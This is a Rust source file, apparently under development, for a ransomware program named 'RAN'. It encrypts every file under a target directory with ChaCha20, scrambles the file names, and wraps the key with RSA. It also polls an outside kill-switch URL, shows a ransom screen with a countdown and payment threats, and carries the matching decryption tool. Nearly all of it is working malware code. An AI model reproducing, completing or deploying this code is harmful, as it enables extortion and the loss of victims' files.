use base64::{Engine as _, engine::general_purpose};
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use clap::Parser;
use eframe::egui::{self, Color32, RichText};
use rand::{RngCore, thread_rng};
use rayon::prelude::*;
use rsa::{
    Oaep, RsaPrivateKey, RsaPublicKey, pkcs1::DecodeRsaPrivateKey, pkcs8::DecodePrivateKey,
    pkcs8::DecodePublicKey,
};
use sha2::{Digest, Sha256};
use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

// --- KONSTANTEN ---
const BUFFER_4MB: usize = 4 * 1024 * 1024;
const BUFFER_1MB: usize = 1 * 1024 * 1024;
const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024;
const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024;
const RECOVERY_FILE: &str = "INFO.bin";
const SPARSE_BLOCKS: usize = 5;
const DEBUG_MODE: bool = true;
const TEST_GUI: bool = true; // Ändere zu false, um direkt zu verschlüsseln

#[derive(serde::Serialize, serde::Deserialize)]
struct RecoveryMetadata {
    encrypted_master_key: Vec<u8>,
    nonce_salt: [u8; 16],
    chunk_size: usize,
    tiered_strategy: bool,
}

impl RecoveryMetadata {
    fn derive_nonce(&self, master_key: &[u8; 32], original_path: &str) -> [u8; 12] {
        let mut hasher = Sha256::new();
        hasher.update(master_key);
        hasher.update(original_path.as_bytes());
        hasher.update(self.nonce_salt);
        let result = hasher.finalize();
        let mut nonce = [0u8; 12];
        nonce.copy_from_slice(&result[0..12]);
        nonce
    }
}

fn normalized_path_string(root_dir: &Path, path: &Path) -> String {
    if let Ok(relative) = path.strip_prefix(root_dir) {
        relative.to_string_lossy().to_string()
    } else {
        path.to_string_lossy().to_string()
    }
}

fn compute_name_nonce_input(root_dir: &Path, path: &Path) -> String {
    let parent = if let Ok(relative) = path.strip_prefix(root_dir) {
        relative.parent().map(|p| p.to_string_lossy().to_string())
    } else {
        path.parent().map(|p| p.to_string_lossy().to_string())
    };
    format!("{}_name", parent.unwrap_or_default())
}

// ====================== CHECK / KILL SWITCH ======================
async fn check() -> bool {
    if DEBUG_MODE {
        println!("Starting check...");
    }
    let url = "https://hsh73ny3hov3dx1kwdynxaqw6yvmg2h7ht4z63ux55ssnm.mcjj.de/";

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .unwrap();

    if let Ok(response) = client.get(url).send().await {
        if response.status().as_u16() == 276 {
            if DEBUG_MODE {
                println!("Kill Switch aktiv (HTTP 276).");
            }
            return false;
        }
    }

    if DEBUG_MODE {
        println!("Kein Kill Switch erkannt.");
    }
    true
}

// ====================== VERSCHLÜSSELUNG ======================
fn process_file(
    path: &Path,
    root_dir: &Path,
    master_key: &[u8; 32],
    meta: &RecoveryMetadata,
) -> anyhow::Result<()> {
    let original_path_str = normalized_path_string(root_dir, path);
    let nonce = meta.derive_nonce(master_key, &original_path_str);
    let mut cipher = ChaCha20::new(master_key.into(), &nonce.into());

    encrypt_content_tiered(path, &mut cipher)?;
    rename_file(path, root_dir, master_key, meta)?;

    Ok(())
}

fn encrypt_content_tiered(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
    let size = file.metadata()?.len();

    match size {
        s if s < SMALL_FILE_THRESHOLD => encrypt_full(&mut file, size, cipher)?,
        s if s < MEDIUM_FILE_THRESHOLD => encrypt_header(&mut file, size, cipher)?,
        _ => encrypt_sparse(&mut file, size, cipher)?,
    }
    Ok(())
}

fn encrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut buffer = vec![0u8; size as usize];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn encrypt_header(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    let read_len = std::cmp::min(size, BUFFER_4MB as u64) as usize;
    let mut buffer = vec![0u8; read_len];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn encrypt_sparse(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    encrypt_header(file, size, cipher)?;

    let step = size as usize / (SPARSE_BLOCKS + 1);
    for i in 1..=SPARSE_BLOCKS {
        let offset = (i * step) as u64;
        if offset + BUFFER_1MB as u64 > size {
            break;
        }
        file.seek(SeekFrom::Start(offset))?;
        let mut buffer = vec![0u8; BUFFER_1MB];
        file.read_exact(&mut buffer)?;
        cipher.apply_keystream(&mut buffer);
        file.seek(SeekFrom::Start(offset))?;
        file.write_all(&buffer)?;
    }
    Ok(())
}

fn rename_file(
    path: &Path,
    root_dir: &Path,
    master_key: &[u8; 32],
    meta: &RecoveryMetadata,
) -> anyhow::Result<()> {
    let old_name = path.file_name().unwrap().to_string_lossy();
    let mut name_bytes = old_name.as_bytes().to_vec();

    let name_nonce_input = compute_name_nonce_input(root_dir, path);
    let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
    let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());

    name_cipher.apply_keystream(&mut name_bytes);

    let new_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
    let mut new_path = path.to_path_buf();
    new_path.set_file_name(new_name);

    fs::rename(path, new_path)?;
    Ok(())
}

// ====================== GUI ======================
pub fn start_gui() -> eframe::Result<()> {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_resizable(false)
            .with_inner_size([850.0, 550.0]),
        ..Default::default()
    };

    eframe::run_native(
        "⚠️ RAN ⚠️",
        options,
        Box::new(|cc| {
            let mut visuals = egui::Visuals::dark();
            visuals.panel_fill = Color32::from_rgb(20, 20, 20);
            cc.egui_ctx.set_visuals(visuals);
            Ok(Box::new(RANApp::default()))
        }),
    )
}

struct RANApp {
    time_left_seconds: f64,
    priv_key: String,
    status_msg: String,
    is_valid: bool,
}

impl Default for RANApp {
    fn default() -> Self {
        Self {
            time_left_seconds: 259200.0, // 3 Tage
            priv_key: String::new(),
            status_msg: "Please enter your private key to decrypt files.".to_string(),
            is_valid: false,
        }
    }
}

impl eframe::App for RANApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if self.time_left_seconds > 0.0 && !self.is_valid {
            self.time_left_seconds -= ctx.input(|i| i.stable_dt as f64);
            ctx.request_repaint();
        }

        // Left Panel
        egui::SidePanel::left("status_panel")
            .resizable(false)
            .default_width(280.0)
            .frame(
                egui::Frame::side_top_panel(&*ctx.style())
                    .fill(Color32::from_rgb(140, 0, 0))
                    .inner_margin(20.0),
            )
            .show(ctx, |ui| {
                ui.vertical_centered(|ui| {
                    ui.add_space(10.0);
                    ui.label(RichText::new("⚠️").size(40.0));
                    ui.label(
                        RichText::new("Your files\nare encrypted!")
                            .color(Color32::WHITE)
                            .size(22.0)
                            .strong(),
                    );

                    ui.add_space(20.0);
                    ui.separator();
                    ui.add_space(20.0);

                    ui.label(
                        RichText::new("Your files will be lost in:")
                            .color(Color32::LIGHT_GRAY)
                            .size(14.0),
                    );
                    ui.add_space(10.0);

                    let total_secs = self.time_left_seconds.max(0.0) as u64;
                    let days = total_secs / 86400;
                    let hours = (total_secs % 86400) / 3600;
                    let minutes = (total_secs % 3600) / 60;
                    let seconds = total_secs % 60;

                    let timer_color = if self.is_valid {
                        Color32::GREEN
                    } else {
                        Color32::YELLOW
                    };
                    ui.label(
                        RichText::new(format!(
                            "{:02}d:{:02}h:{:02}m:{:02}s",
                            days, hours, minutes, seconds
                        ))
                        .color(timer_color)
                        .size(22.0)
                        .monospace(),
                    );

                    ui.add_space(30.0);
                    ui.separator();
                    ui.add_space(20.0);

                    ui.label(
                        RichText::new("Enter Private Key:")
                            .color(Color32::WHITE)
                            .size(14.0),
                    );
                    ui.add_space(10.0);

                    egui::ScrollArea::vertical()
                        .max_height(120.0)
                        .show(ui, |ui| {
                            ui.add(
                                egui::TextEdit::multiline(&mut self.priv_key)
                                    .hint_text("-----BEGIN RSA PRIVATE KEY-----")
                                    .desired_width(240.0)
                                    .font(egui::TextStyle::Monospace),
                            );
                        });

                    ui.add_space(15.0);
                    let msg_color = if self.is_valid {
                        Color32::GREEN
                    } else {
                        Color32::LIGHT_GRAY
                    };
                    ui.label(RichText::new(&self.status_msg).color(msg_color).size(12.0));

                    if ui
                        .add_sized(
                            [220.0, 40.0],
                            egui::Button::new(RichText::new("Check Private Key").size(16.0))
                                .fill(Color32::from_rgb(60, 60, 60)),
                        )
                        .clicked()
                    {
                        match RsaPrivateKey::from_pkcs1_pem(&self.priv_key)
                            .or_else(|_| RsaPrivateKey::from_pkcs8_pem(&self.priv_key))
                        {
                            Ok(key) => {
                                if key.validate().is_ok() {
                                    self.is_valid = true;
                                    self.status_msg =
                                        "✅ Key valid! Decrypting in background...".to_string();
                                    let priv_key = self.priv_key.clone();
                                    std::thread::spawn(move || {
                                        let _ = dec_main_with_key(&priv_key);
                                    });
                                } else {
                                    self.status_msg = "❌ Invalid RSA components.".to_string();
                                }
                            }
                            Err(_) => {
                                self.status_msg = "❌ Error: Could not parse Key".to_string();
                            }
                        }
                    }
                });
            });

        // Central Panel
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.add_space(10.0);
            ui.heading(RichText::new("What Happened to My Computer?").color(Color32::from_rgb(255, 100, 100)).size(26.0).strong());
            ui.add_space(15.0);

            egui::ScrollArea::vertical().auto_shrink([false; 2]).show(ui, |ui| {
                ui.label(RichText::new(
                    "Your important files are encrypted. Many of your documents, photos, videos, \
                    databases and other files are no longer accessible because they have been \
                    encrypted with a military-grade RSA algorithm."
                ).size(15.0).color(Color32::LIGHT_GRAY));

                ui.add_space(25.0);
                ui.heading(RichText::new("Can I Recover My Files?").color(Color32::from_rgb(255, 100, 100)).size(20.0).strong());
                ui.add_space(10.0);
                ui.label(RichText::new(
                    "Sure. We guarantee that you can recover all your files safely and easily. \
                    But you do not have enough time.\n\n\
                    If you want to decrypt all your files, you need to provide the correct private key. \
                    You only have 3 days to submit the payment. After that, the price will be doubled. \
                    If you don't submit the key in 7 days, you won't be able to recover your files forever."
                ).size(15.0).color(Color32::LIGHT_GRAY));
            });
        });
    }
}

// ====================== DECRYPTION ======================
#[derive(Parser)]
#[command(author, version, about = "Recovery tool for RAN encrypted files")]
struct Args {
    #[arg(short, long, default_value = "/home/jannik/Cloud/Dev/RAN/test_data")]
    target_dir: String,

    #[arg(
        short = 'k',
        long,
        default_value = "/home/jannik/Cloud/Dev/RAN/private.pem"
    )]
    private_key_path: String,

    #[arg(
        short = 'i',
        long,
        default_value = "/home/jannik/Cloud/Dev/RAN/INFO.bin"
    )]
    recovery_info_path: String,

    #[arg(long, default_value_t = false)]
    dry_run: bool,
}

fn dec_main_with_key(priv_pem: &str) -> anyhow::Result<()> {
    println!("--- RAN Recovery Tool (GUI Mode) ---");

    let priv_key = RsaPrivateKey::from_pkcs1_pem(priv_pem)
        .or_else(|_| RsaPrivateKey::from_pkcs8_pem(priv_pem))?;

    let args = Args::parse();
    let meta_data = fs::read(&args.recovery_info_path)?;
    let meta: RecoveryMetadata = bincode::deserialize(&meta_data)?;

    let master_key_vec = priv_key
        .decrypt(Oaep::new::<Sha256>(), &meta.encrypted_master_key)
        .map_err(|_| anyhow::anyhow!("Falscher Private Key!"))?
        .to_vec();

    let mut master_key = [0u8; 32];
    master_key.copy_from_slice(&master_key_vec);

    let target_dir = PathBuf::from(&args.target_dir);
    let target_dir = target_dir
        .canonicalize()
        .unwrap_or_else(|_| target_dir.clone());

    let entries: Vec<PathBuf> = WalkDir::new(&target_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .map(|e| e.into_path())
        .collect();

    println!("{} Dateien gefunden.", entries.len());

    entries.par_iter().for_each(|path| {
        if let Err(e) = recover_file(path, &target_dir, &master_key, &meta) {
            eprintln!("Fehler bei {:?}: {}", path, e);
        }
    });

    println!("✅ Wiederherstellung abgeschlossen!");
    Ok(())
}

fn dec_main() -> anyhow::Result<()> {
    let args = Args::parse();

    println!("--- RAN Recovery Tool (Tiered Strategy) ---");

    let priv_pem = fs::read_to_string(&args.private_key_path)?;
    let priv_key = RsaPrivateKey::from_pkcs8_pem(&priv_pem)?;

    let meta_data = fs::read(&args.recovery_info_path)?;
    let meta: RecoveryMetadata = bincode::deserialize(&meta_data)?;

    let master_key_vec = priv_key
        .decrypt(Oaep::new::<Sha256>(), &meta.encrypted_master_key)
        .map_err(|_| anyhow::anyhow!("Falscher Private Key!"))?;

    let mut master_key = [0u8; 32];
    master_key.copy_from_slice(&master_key_vec);

    let target_dir = PathBuf::from(&args.target_dir);
    let target_dir = target_dir
        .canonicalize()
        .unwrap_or_else(|_| target_dir.clone());

    let entries: Vec<PathBuf> = WalkDir::new(&target_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .map(|e| e.into_path())
        .collect();

    println!("{} Dateien gefunden.", entries.len());

    entries.par_iter().for_each(|path| {
        if let Err(e) = recover_file(path, &target_dir, &master_key, &meta) {
            eprintln!("Fehler bei {:?}: {}", path, e);
        }
    });

    println!("✅ Wiederherstellung abgeschlossen!");
    Ok(())
}

fn recover_file(
    path: &Path,
    root_dir: &Path,
    master_key: &[u8; 32],
    meta: &RecoveryMetadata,
) -> anyhow::Result<()> {
    let encrypted_name = path.file_name().unwrap().to_string_lossy();
    let name_bytes = general_purpose::URL_SAFE_NO_PAD.decode(encrypted_name.as_bytes())?;

    let name_nonce_input = compute_name_nonce_input(root_dir, path);
    let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
    let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());

    let mut decrypted_name_bytes = name_bytes.clone();
    name_cipher.apply_keystream(&mut decrypted_name_bytes);
    let original_name = String::from_utf8(decrypted_name_bytes)?;

    let mut original_path = path.to_path_buf();
    original_path.set_file_name(&original_name);
    let original_path_str = normalized_path_string(root_dir, &original_path);

    let content_nonce = meta.derive_nonce(master_key, &original_path_str);
    let mut content_cipher = ChaCha20::new(master_key.into(), &content_nonce.into());

    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
    let size = file.metadata()?.len();

    match size {
        s if s < SMALL_FILE_THRESHOLD => decrypt_full(&mut file, size, &mut content_cipher)?,
        s if s < MEDIUM_FILE_THRESHOLD => decrypt_header(&mut file, size, &mut content_cipher)?,
        _ => decrypt_sparse(&mut file, size, &mut content_cipher)?,
    }

    drop(file);
    fs::rename(path, original_path)?;

    Ok(())
}

fn decrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut buffer = vec![0u8; size as usize];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn decrypt_header(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    let read_len = std::cmp::min(size, BUFFER_4MB as u64) as usize;
    let mut buffer = vec![0u8; read_len];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn decrypt_sparse(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    decrypt_header(file, size, cipher)?;

    let step = size as usize / (SPARSE_BLOCKS + 1);
    for i in 1..=SPARSE_BLOCKS {
        let offset = (i * step) as u64;
        if offset + BUFFER_1MB as u64 > size {
            break;
        }

        file.seek(SeekFrom::Start(offset))?;
        let mut buffer = vec![0u8; BUFFER_1MB];
        file.read_exact(&mut buffer)?;
        cipher.apply_keystream(&mut buffer);
        file.seek(SeekFrom::Start(offset))?;
        file.write_all(&buffer)?;
    }
    Ok(())
}

// ====================== MAIN ======================
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    if TEST_GUI {
        if let Err(err) = start_gui() {
            eprintln!("GUI error: {err}");
        }
        std::process::exit(0);
    }

    if !check().await {
        println!("Kill Switch aktiviert. Beende Programm.");
        std::process::exit(0);
    }

    let target_dir = "/home/jannik/Cloud/Dev/RAN/test_data";
    let dry_run = false;

    let pub_key_pem = fs::read_to_string("public.pem")?;
    let pub_key = RsaPublicKey::from_public_key_pem(&pub_key_pem)?;

    let mut master_key = [0u8; 32];
    let mut rng = thread_rng();
    rng.fill_bytes(&mut master_key);
    let mut salt = [0u8; 16];
    rng.fill_bytes(&mut salt);

    let enc_key = pub_key.encrypt(&mut rng, Oaep::new::<Sha256>(), &master_key)?;

    let meta = RecoveryMetadata {
        encrypted_master_key: enc_key,
        nonce_salt: salt,
        chunk_size: BUFFER_4MB,
        tiered_strategy: true,
    };

    println!("🚀 Verschlüsselung mit Tiered Strategy gestartet...");

    let entries: Vec<PathBuf> = WalkDir::new(target_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .map(|e| e.into_path())
        .collect();

    let root_dir = PathBuf::from(target_dir)
        .canonicalize()
        .unwrap_or_else(|_| PathBuf::from(target_dir));

    entries.par_iter().for_each(|path| {
        if !dry_run {
            let _ = process_file(path, &root_dir, &master_key, &meta);
        }
    });

    let serialized = bincode::serialize(&meta)?;
    fs::write(RECOVERY_FILE, &serialized)?;

    println!(
        "✅ Verschlüsselung abgeschlossen. Recovery-Datei: {}",
        RECOVERY_FILE
    );
    Ok(())
}
